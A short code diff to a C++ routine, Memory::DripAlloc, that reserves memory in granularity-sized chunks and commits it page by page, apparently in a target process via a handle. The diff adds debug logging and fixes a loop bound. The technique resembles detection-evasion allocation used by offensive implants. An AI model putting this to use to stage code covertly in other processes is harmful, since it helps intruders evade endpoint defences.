@@ -91,23 +91,32 @@ auto DECLFN Memory::DripAlloc(
     PVOID  CurrentBase = BaseAddress;
     PVOID* AddressList = (PVOID*)hAlloc( GranCount );
 
+    KhDbg("valid gran memory: %p\n", BaseAddress);
+
     for ( INT i = 0; i < GranCount; i++ ) {
         CurrentBase = Self->Mm->Alloc( 
-            CurrentBase, PageGran, MEM_RESERVE, PAGE_NOACCESS 
+            CurrentBase, PageGran, MEM_RESERVE, PAGE_NOACCESS, Handle
         );
+
+        KhDbg("reserved current[%d] = %p\n", i, CurrentBase);
+
         AddressList[i] = CurrentBase;
         CurrentBase    = (PVOID)( (UPTR)CurrentBase + PageGran );
     }  
 
-    for ( INT x = 0; x < PageGran; x++ ) {
+    for ( INT x = 0; x < GranCount; x++ ) {
         for ( INT z = 0; z < PageCount; z++ ) {
             CurrentBase = (PVOID)( (UPTR)( AddressList[x] ) + ( z * PageSize ) );
 
             CurrentBase = Self->Mm->Alloc( 
                 CurrentBase, PageSize, MEM_COMMIT, Protect, Handle 
             );
+
+            KhDbg("commit current[%d] = %p\n", z, CurrentBase);
         }
     }
+
+    KhDbg("base %p\n", BaseAddress);
 
     return BaseAddress;
 }
